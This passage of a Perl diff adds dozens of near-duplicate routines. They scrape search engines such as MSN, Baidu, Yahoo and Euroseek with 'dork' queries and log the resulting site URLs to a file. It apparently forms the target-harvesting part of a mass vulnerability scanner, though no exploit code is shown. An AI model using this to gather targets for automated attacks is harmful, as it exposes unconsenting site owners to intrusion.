+    for ( $i = 1 ; $i <= 1000 ; $i += 10 ) {
+        my $Msn = ( "http://search.msn.co.uk/results.aspx?q=".key($key)."&first=".$i."&FORM=PERE" );
+        my $re = query($Msn);
+        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
+            if ( $1 !~ /msn|live/ ) {
+                my $k    = $1;
+                my @grep = links($k);
+                open( $filez, ">>", $name );
+                foreach my $k (@grep) {
+                    print $filez "$k\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+ 
+sub msncn() {
+    my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
+    for ( $i = 1 ; $i <= 1000 ; $i += 10 ) {
+        my $Msn = ( "http://cnweb.search.live.com/results.aspx?q=".key($key)."&first=".$i."&FORM=PERE3" );
+        my $re = query($Msn);
+        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
+            if ( $1 !~ /msn|live/ ) {
+                my $k    = $1;
+                my @grep = links($k);
+                open( $filez, ">>", $name );
+                foreach my $k (@grep) {
+                    print $filez "$k\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+ 
+sub msnca(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=en-ca&scope=&FORM=PERE"); 
+my $Res=query($MsN); 
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
+if($1 !~ /msn|live/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}
+if ($Res =~ /nextPage disabled/)
+{return @lst;}}
+return @lst;
+}
+ 
+sub msnfr(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=fr-fr&scope=&FORM=PERE"); 
+my $Res=query($MsN); 
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
+if($1 !~ /msn|live/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}
+if ($Res =~ /nextPage disabled/)
+{return @lst;}}
+return @lst;
+}
+ 
+sub msnbe(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=nl-be&scope=&FORM=PERE"); 
+my $Res=query($MsN); 
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
+if($1 !~ /msn|live/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}
+if ($Res =~ /nextPage disabled/)
+{return @lst;}}
+return @lst;
+} 
+ 
+sub msnjp(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=ja-jp&scope=&FORM=PERE"); 
+my $Res=query($MsN); 
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
+if($1 !~ /msn|live/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}
+if ($Res =~ /nextPage disabled/)
+{return @lst;}}
+return @lst;
+}
+ 
+sub libero(){
+my @lst;
+my $key=$_[0];
+my $i=0;
+my $pg=0;
+for($i=0,$pg=0; $i<=1000; $i+=10,$pg++)
+{
+my $Lib=("http://arianna.libero.it/search/abin/integrata.cgi?s=1&pag=".$pg."&start=".$i."&query=".key($key));
+my $Res=query($Lib);
+while($Res =~ m/<a class=\"testoblu\" href=\"?http:\/\/([^>\"]*)\//g){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub ask () {
+    my $key = $_[0];
+    my $name = $_[1];
+    my @lst;
+    my $askt = ("http://it.ask.com/web?q=".key($key)."&qsrc=1&o=312&l=dir&dm=all");
+    my $asktest = query($askt);
+    if ($asktest =~ /non ha prodotto alcun risultato/) {
+        return @lst;
+    }
+    else {
+        for ($p=0;$p<=20;$p++){
+            my $asklink = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=612B74535B00F6CA7678625658F9B98C&dm=all&page=".$p);
+            my $re = query($asklink);
+            while($re =~ m/href=\"http:\/\/(.+?)\"/ig){
+                my $tsite = $1;
+                if ($tsite !~ /ask|wikipedia/){
+                    my @grep = links($tsite);
+                    open( $filez, ">>", $name );
+                    foreach my $tsite (@grep) {
+                        print $filez "$tsite\n";
+                    }
+                    close $filez;
+                    push( @lst, @grep );
+                }
+            }
+        }
+        return @lst;
+    }
+}
+ 
+sub allthewebt {
+my @lang = ("en","es","de","nl","pt-BR","it","de","fo","dk","hu","no","us");
+my @lst;
+my $key=key($_[0]);
+my $c=0;
+foreach my $lang (@lang){
+my @lista = alltheweb($key,$lang[$c]);
+push(@lst,@lista);
+$c++;
+}
+return @lst;
+}
+ 
+sub alltheweb() {
+    my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
+    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
+        my $All = ( "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=". key($key) . "&o=". $i );
+        my $re = query($All);
+        while ( $re =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/ig ) {
+            my $k = $1;
+            $k =~ s/ //g;
+            my @grep = links($k);
+            open( $filez, ">>", $name );
+            foreach my $k (@grep) {
+                print $filez "$k\n";
+            }
+            close $filez;
+            push( @lst, @grep );
+        }
+    }
+    return @lst;
+}
+ 
+ 
+sub powersearch()
+{
+my @lst;
+my $key=$_[0];
+my $i=0;
+for($i=0; $i<=760; $i+=10)
+{
+my $pow=("http://www.baidu.com/s?lm=0&si=&rn=10&ie=gb2312&ct=0&wd=".key($key)."&pn=".$i."&ver=0&cl=3");
+my $Res=query($pow);
+while($Res =~ m/href=\"http:\/\/(.*?)\"/ig){
+my $k=$1;
+$k=~s/ //g;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub euro()
+{
+my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
+    for ( $p = 0 ; $p <= 1000 ; $p += 10 ) {
+        my $gp = ("http://euroseek.com/system/search.cgi?language=en&mode=internet&start=".$p."&string=".key($key));
+        my $re = query($gp);
+        while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig ) {
+            my $k = $1;
+            my @grep = links($k);
+            open( $filez, ">>", $name );
+            foreach my $k (@grep) {
+                print $filez "$k\n";
+            }
+            close $filez;
+            push( @lst, @grep );
+        }
+    }
+    return @lst;
+}
+ 
+sub msnit()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 1 ;$i <= 1000 ;$i += 10) {
+my $msnit = ("http://search.msn.it/results.aspx?q=".key($key)."&first=".$i."&FORM=PORE");
+my $re = query($msnit);
+while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub euroit()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=it&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/href=\"?http:\/\/(.+?)\"/ig) { 
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub eurode()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=de&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub euroda()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=da&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub euroes()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=es&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub eurofr()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=fr&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub eurono()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=no&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub eurosv()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=sv&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub eurocs()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=cs&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub euronl()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=nl&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub europl()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=pl&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub euroru()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=ru&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub eurofi()
+{
+my @lst;
+my $key  = $_[0];
+for ($i = 0 ;$i <= 1000 ;$i += 10) {
+my $gplink = ("http://euroseek.com/system/search.cgi?language=fi&mode=internet&start=".$i."&string=".key($key));
+my $re = query($gplink);
+while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/ig) {
+my $k = $1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub abacho() {
+    my $dork = $_[0];
+    my $name = $_[1];
+    my $atest = ("http://search.abacho.com/it/abacho.it/index.cfm?q=".key($dork)."&country=it&x=0&y=0");
+    my $re = query($atest);
+    if ($re =~ /We didn't find any results matching your query/) {
+        return @list;
+    }
+    else {
+        for ($i = 0;$i <= 1000; $i += 10) {
+            my $alink = ("http://search.abacho.com/it/abacho.it/index.cfm?offset=".$i."&poffset=0&StartCounter=".$i."&q=".key($dork)."&a=&b=&country=it&page=&d_html=&d_pdf=&d_msdoc=&d_xls=&d_ppt=&mesearchkey=&cluster=&coop=");
+            my $re = query($alink);
+            while ($re =~ m/target=\"_blank\">http:\/\/(.+?)<\/a>/g) {
+                my $h = $1;
+                push(@sgrep,$h);
+            }
+        }
+        my @list = fprint($name,@sgrep);
+        return @list;
+    }
+}
+ 
+sub altacom(){
+my @lst;
+my $key = $_[0];
+for($b=1;$b<=1000;$b+=10){
+my $AlTa=("http://www.altavista.com/web/results?itag=ody&kgs=3&q=".key($key)."&stq=".$b);
+my $Res=query($AlTa);
+while($Res=~m/<span class=ngrn>(.+?)\//g){
+if($1 !~ /altavista/){
+my $k=$1;
+$k=~s/<//g;
+$k=~s/ //g;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub mozbot() {
+    my @lst;
+    my $key=$_[0];
+    my $i=0;
+    my $pg=0;
+    for ( $i=0; $i <= 100; $i += 1 ) {
+    my $mozbot = ( "http://www.mozbot.fr/search?q= ".key($key)." &st=int&page= ".$i );
+    my $Res = query($mozbot);
+    while ( $Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g) {
+    my $k=$1;
+    $k=~s/ //g;
+    my @grep = links($k);
+    push( @lst, @grep );
+   }
+ if ( $Res =~ /Cliquez ici pour effectuer/ ) {
+ return @lst; }
+ }
+ return @lst;
+}
+ 
+sub hotbot(){
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=100){
+my $hot=("http://search.hotbot.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=hb_loc&enc=utf-8".$b);
+my $Res=query($hot);
+while($Res =~ m/<span class=\"green\">(.+?)<\/span>/g ){
+if ($1 !~ /msn|live|google|yahoo/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub virgilio(){
+my @lst;
+my $key=$_[0];
+my $i=0;
+for($i=0; $i<=1000; $i+=10)
+{
+my $ali=("http://ricerca.alice.it/ricerca?qs=".key($key)."&filter=0&site=&lr=&hits=10&offset=".$i);
+my $Res=query($ali);
+while($Res =~ m/<a href=\"?http:\/\/(.+?)\" class=\"link16\">/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub entw(){
+my @lst;
+my $key=$_[0];
+my $i=0;
+for($i=0; $i<=1000; $i+=10)
+{
+my $ent=("http://www.entireweb.com/search0/?n=10&q=".key($key)."&x=0&y=0&region=&of=".$i);
+my $Res=query($ent);
+while($Res =~ m/<a class="ewtitle" href=\"?http:\/\/(.+?)\">/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub giga(){
+my @lst;
+my $key=$_[0];
+my $i=0;
+for($i=0; $i<=1000; $i+=10)
+{
+my $gig=("http://www.gigablast.com/index.php?q=".key($key)."&s=".$i);
+my $Res=query($gig);
+while($Res =~ m/href=\"?http:\/\/(.+?)\"/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+ 
+sub metas(){
+my @lst;
+my $key=$_[0];
+my $i=0;
+for($i=1; $i<=100; $i+=1)
+{
+my $met=("http://www.windseek.com/query?q=".key($key)."&p=".$i."&se=w");
+my $Res=query($met);
+while($Res =~ m/href=\"?http:\/\/(.+?)\"/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub highit(){
+my @lst;
+my $key=$_[0];
+my $i=0;
+for($i=0; $i<=1000; $i+=10)
+{
+my $higit=("http://ita.hispeed.ch/Ricerca/?st=s&q2=".key($key)."&q3=&q4=&q5=&l2=&l3q=i&l3=&l4=all&l5=any&l6q=i&l6=&l7=Array&rl=10&fi=".$i."&q1=".key($key)."&submitbutton=Ricerca&l1=web");
+my $Res=query($higit);
+while($Res =~ m/<a href=\"?http:\/\/(.+?)\"/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub high(){
+my @lst;
+my $key=$_[0];
+my $i=0;
+for($i=0; $i<=1000; $i+=10)
+{
+my $higit=("http://eng.hispeed.ch/Search/?st=s&q2=".key($key)."&q3=&q4=&q5=&l2=&l3q=i&l3=&l4=all&l5=any&l6q=i&l6=&l7=Array&rl=10&fi=".$i."&q1=".key($key)."&submitbutton=Search&l1=web");
+my $Res=query($higit);
+while($Res =~ m/<a href=\"?http:\/\/(.+?)\"/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub uol(){
+my @lst;
+my $key = $_[0];
+for($i=0;$i<=1000;$i+=10){
+my $UoL=("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$i);
+my $Res=query($UoL);
+while($Res =~ m/<a href=\"http:\/\/(.+?)\">/ig){
+my $k=$1;
+if($k!~/busca|uol|yahoo/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub sapo(){
+my @lst;
+my $key = $_[0];
+for($i=1;$i<=100;$i+=1){
+my $Sapo=("http://pesquisa.sapo.pt/search?page=".$i."&location=pt&st=.pt&barra=resumo&q=".key($key));
+my $Res=query($Sapo);
+while($Res =~ m/href=\"?http:\/\/(.+?)\"/ig){
+my $k=$1;
+$k=~s/ //g;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub guruji(){
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=10){
+my $guruji=("http://www.guruji.com/search?q=".key($key)."&s=".$b);
+my $Res=query($guruji);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub naver() {
+    my @lst;
+    my $key = $_[0];
+    for ( $b=1; $b <= 1000; $b += 10 ) {
+    my $naver = ( "http://web.search.naver.com/search.naver?where=webkr&query= ".key($key)." &xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start= ".$i );
+    my $Res = query($naver);
+    while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
+    my $k = $1;
+    if($k!~/busca|uol|yahoo/) {
+    my $k = $1;
+    my @grep = links($k);
+    push( @lst, @grep);
+    }
+   }
+  }
+ return @lst;
+}
+ 
+#####
+# SUBS Yahoo
+#####
+sub yahoo(){
+my @lst;
+my $key = $_[0];
+for($b=1;$b<=1000;$b+=100){
+my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
+my $Res=query($Ya);
+while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
+my $k=$1;
+$k=~s/<b>//g;
+$k=~s/<\/b>//g;
+$k=~s/<wbr>//g;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub ybypass () { # GoodSearch uses the same search type of Yahoo
+    my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
+    my $ybytest = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($key)."&page=1&osmax=16");
+    my $res = query($ybytest);
+    if ($res =~ /Your search did not yield any results/){
+        return @lst;
+    }
+    else {
+        for $p(1..50){
+            my $ybylink = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($key)."&page=".$p."&osmax=16");
+            my $rek = query($ybylink);
+            while ($rek =~ m/href=\"(.+?)\">(.+?)<\/a>/g) {
+                my $tsite = $2;
+                if (($tsite =~ /\./) && ($tsite !~ /<|>| /)){
+                    my @grep = links($tsite);
+                    open( $filez, ">>", $name );
+                    foreach my $tsite (@grep) {
+                        print $filez "$tsite\n";
+                    }
+                    close $filez;
+                    push( @lst, @grep );
+                }
+            }
+        }
+        return @lst;
+    }
+}
+ 
+#####
+# SUBS Lycos
+#####
+sub lycos(){
+my @lst;
+my $key = $_[0];
+for($b=1;$b<99;$b+=1){
+my $lycos=("http://suche.lycos.de/cgi-bin/pursuit?pag=".$b."&query=".key($key)."&SITE=de&cat=loc&enc=utf-8");
+my $Res=query($lycos);
+while($Res =~ m/href=\"(.+?)\"/ig){
+my $k=$1;
+if($k!~/lycos/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+ 
+sub walhello() {
+    my $dork = $_[0];
+    my $name = $_[1];
+    my $wtest = ("http://www.walhello.info/search?key=".key($dork)."&taal=a&nummer=0&&web=no&&vert=2&");
+    my $re = query($wtest);
+    if ($re =~ /Verzeihung, Nichts gefunden/) {
+        return @list;
+    }
+    else {
+        for $i(0..99) {
+            my $wlink = ("http://www.walhello.info/search?key=".key($dork)."&taal=a&nummer=".$i."&&web=no&&vert=2&");
+            my $re = query($wlink);
+            while($re =~ m/<a href=http:\/\/(.+?)>/g) {
+                my $h = $1;
+                if ($h !~ /walhello|microsoft|wikipedia/){
+                    push(@sgrep,$h);
+                }
+            }
+        }
+        my @list = fprint($name,@sgrep);
+        return @list;
+    }
+}
+ 
+sub webde () {
+    my $key = $_[0];
+    my $name = $_[1];
+    my @lst;
+    for $p(1..50){
+        my $webdelink = ("http://suche.web.de/search/web/?pageIndex=".$p."&su=".key($key)."&y=0&x=0&mc=suche@web@navigation@zahlen.suche@web");
+        my $re = query($webdelink);
+        while($re =~ m/href=\"http:\/\/(.+?)\">/ig) {
+            my $tsite = $1;
+            if ($tsite !~ /\/search\/web|web.de|\" class=\"neww\"/){
+                my @grep = links($tsite);
+                open( $filez, ">>", $name );
+                foreach my $tsite (@grep) {
+                    print $filez "$tsite\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+ 
+ 
+sub askde(){
+my @lst;
+my $key=$_[0];
+my $i=0;
+my $pg=0;
+for($b=1;$b<=100;$b+=1){
+my $Ask=("http://de.ask.com/web?q=".key($key)."&dm=all&page=".$i);
+my $Res=query($Ask);
+while ($Res=~ m/<href=\"http:\/\/(.+?)\"/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub nigma(){
+my @lst;
+my $key=$_[0];
+for($b=1;$b<=1000;$b+=20){
+my $nig=("http://nigma.ru/index.php?s=".key($key)."&gl=1&yh=1&ms=1&yn=1&rm=1&av=1&ap=1&nm=1&k=8oRJ&startpos=".$b);
+my $Res=query($nig);
+while ($Res=~ m/href=\"http:\/\/(.+?)\"/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub zizup(){
+my @lst;
+my @a;
+my $key=$_[0];
+for($i=1;$i<=100;$i++){
+my $zizup=("http://www.zizup.com/search.php?type=Web&c=1&index=".$i."&search=".key($key));
+my $Res=query($zizup);
+while ($Res=~ m/<a href=\"http:\/\/(.*?)\"/ig){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub aol() {
+    my $dork = $_[0];
+    my $name = $_[1];
+    my $atest = ("http://search.aol.com/aol/search?invocationType=topsearchbox.search&query=".key($dork));
+    my $re = query($atest);
+    if ($re =~ /returned no results\.<\/h3>/) {
+        return @list;
+    }
+    else {
+        for $i(1..100){
+            my $alink = ("http://search.aol.com/aol/search?query=".key($dork)."&page=".$i."&nt=SG2&do=Search&invocationType=comsearch30&clickstreamid=3154480101243260576");
+            my $re = query($alink);print "$re\n";
+            while($re =~ m/\"deleted\" property=\"f:url\">http:\/\/(.+?)<\/p>/g) {
+                my $h = $1;
+                push(@sgrep,$h);
+            }
+        }
+        my @list = fprint($name,@sgrep);
+        return @list;
+    }
+}
+ 
+sub india(){
+my $key=$_[0];
+my @lst;
+my $pg=0;
+for($i=0; $i<=1000;$i+=10) {
+my $ind=("http://indiainfo-search.altavista.com/search?kl=XX&search=Search&what=web&dp=&q=".key($key)."&stq=".$i);
+my $Res=query($ind);
+while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target=\"_self\">/ig){
+my $k="$1/";
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub aol3(){
+my $key=$_[0];
+my @lst;
+my $pg=0;
+for($pg=0; $pg<=100;$pg++) {
+my $Lib=("http://search.aol.co.uk/aol/search?query=".key($key)."&page=$pg&isinit=true&restrict=countryUK&cr=countryUK&userid=3696368980330600879&avtype=&invocationType=hf_aoluk_po_ws_unauth&clickstreamid=3696368980330600877");
+my $Res=query($Lib);
+while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g ){
+my $k="$1/";
+my @grep=links($k);
+push(@lst,@grep);
+}}
+return @lst;
+}
+ 
+sub aolx() {
+    my $key = $_[0];
+    my $name = $_[1];
+    my @lst;
+    my $aolt = ("http://search.aol.com/aol/search?invocationType=topsearchbox.search&query=".key($key));
+    my $atest = query($aolt);
+    if ($atest =~ /returned no results.<\/h3>/) {
+        return @lst;
+    }
+    else {
+        for ($p=1;$p<=100;$p++){
+            my $aollink = ("http://search.aol.com/aol/search?query=".key($key)."&page=".$p."&nt=SG2&do=Search&invocationType=comsearch30&clickstreamid=3154480101243260576");
+            my $re = query($aollink);
+            while($re =~ m/<p class=\"durl find\" property=\"f:durl\">(.+?)\n-/ig) {
+                my $tsite = $1;
+                my @grep = links($tsite);
+                open( $filez, ">>", $name );
+                foreach my $tsite (@grep) {
+                    print $filez "$tsite\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+    return @lst;
+    }
+}
+ 
+sub dmoz() {
+    my $key = $_[0];
+    my $name = $_[1];
+    my @lst;
+    my $dmtest = ("http://search.dmoz.org/cgi-bin/search?search=".key($key));
+    my $dmq = query($dmtest);
+    if ($dmq =~ /No <b><a href=\"http:\/\/dmoz.org\/\">Open Directory Project<\/a><\/b> results found/){
+        return @lst;
+    }
+    elsif ($dmq =~ /of (.+?)\)<p>/){
+        my $ftot = $1;
+        if ($ftot <= 20) {
+            $max = 1;
+        }
+        else {
+            my $to = $ftot / 20;
+            if ($to =~ /(.+).(.+?)/){
+                $uik = $1 * 20;
+                $max = $uik +1;
+            }
+            elsif ($to =~ /[0-9]/) {
+                my $to--;
+                my $rej = $to * 20;
+                $max = $rej +1;
+            }
+        }
+    }
+    for ($p=1;$p<=$max;$p += 20){
+        my $dmozlink = ("http://search.dmoz.org/cgi-bin/search?search=".key($key)."&utf8=1&locale=it_it&start=".$p);
+        my $re = query($dmozlink);
+        if ($re =~ /\">Next<\/a>/) {
+            while($re =~ m/<a href=\"http:\/\/(.+?)\"/ig) {
+                my $tsite = $1;
+                if ($tsite !~ /dmoz/){
+                    my @grep = links($tsite);
+                    open( $filez, ">>", $name );
+                    foreach my $tsite (@grep) {
+                        print $filez "$tsite\n";
+                    }
+                    close $filez;
+                    push( @lst, @grep );
+                }
+            }
+        }
+    }
+    return @lst;
+}
+ 
+sub einet() {
+    my $key = $_[0];
+    my $name = $_[1];
+    my @lst;
+    my $einetest = ("http://www.einet.net/view/search.gst?p=1&k=".key($key)."&s=0&submit=Search");
+    my $einet3st = query($einetest);
+    if ($einet3st =~ /<span class=nPage>Page 1 of\s+(.+?)<\/span>/){
+        my $totz = $1;
+        for ($p=1;$p<=$totz;$p++){
+            my $einetlink = ("http://www.einet.net/view/search.gst?p=".$p."&k=".key($key)."&s=0&submit=Search");
+            my $re = query($einetlink);
+            while($re =~ m/<span class=url2>\s+(.+?)<\/span>/ig) {
+                my $tsite = $1;
+                my @grep = links($tsite);
+                open( $filez, ">>", $name );
+                foreach my $tsite (@grep) {
+                    print $filez "$tsite\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+ 
+sub links()
+{
+my @l;
+my $link=$_[0];
+my $host=$_[0];
+my $hdir=$_[0];
+$hdir=~s/(.*)\/[^\/]*$/\1/;
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+$host.="/";
+$link.="/";
+$hdir.="/";
+$host=~s/\/\//\//g;
+$hdir=~s/\/\//\//g;
+$link=~s/\/\//\//g;
+push(@l,$link,$host,$hdir);
+return @l;
+}
+ 
+sub geths(){
+my $host=$_[0];
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+return $host;
+}
+ 
+sub key(){
+my $chiave=$_[0];
+$chiave =~ s/ /\+/g;
+$chiave =~ s/:/\%3A/g;
+$chiave =~ s/\//\%2F/g;
+$chiave =~ s/&/\%26/g;
+$chiave =~ s/\"/\%22/g;
+$chiave =~ s/,/\%2C/g;
+$chiave =~ s/\\/\%5C/g;
+return $chiave;
+}
+ 
+sub query($){
+my $url=$_[0];
+$url=~s/http:\/\///;
+my $host=$url;
+my $query=$url;
+my $page="";
